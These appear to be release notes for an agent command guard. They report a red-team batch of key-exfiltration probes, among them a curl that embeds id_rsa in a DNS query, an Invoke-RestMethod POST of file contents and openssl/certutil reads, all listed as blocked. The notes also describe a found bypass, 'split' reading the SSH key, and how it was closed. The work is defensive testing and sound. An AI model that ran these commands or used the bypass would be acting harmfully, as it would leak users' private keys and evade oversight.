# Axiom 0.69.0

**Released:** 16 November 2026

## Guard

Batch 8 probed exfiltration through query strings, HTTP clients and file-splitting tools on 0.68 hooks
(issue #393).

Blocked already: `curl "https://dns.google/resolve?name=$(cat …id_rsa)"`,
`Get-Content … | Invoke-RestMethod -Method Post`, `curl --doh-url … --data @key`,
`openssl s_client … < key`, `certutil -encodehex`, `Get-FileHash key`, `type key | tee`,
`attrib +h key`. Control `Get-FileHash C:\Lab\notes.txt` allows.

Found and fixed: `split -b 100 …\.ssh\id_rsa C:\Lab\part` — the tool reads the key and writes it in
chunks. `split ` and `csplit ` join the read verbs, so the call blocks as `read`. Batch 8 re-verified
**10/10**; batches 1-7 stay clean.

## Verification

- `dotnet build Axiom.sln -c Release` — 0 warnings, 0 errors; full suite green before packaging.
- `AgentCommandGuardTests` updated; installed in the lab VM silently and re-tested after publishing.

## Notes

- The ADS control (`Get-Content -Stream secret C:\Lab\x.txt`) stays allowed: it touches a non-protected
  file, so it is not a bypass of the key guard.
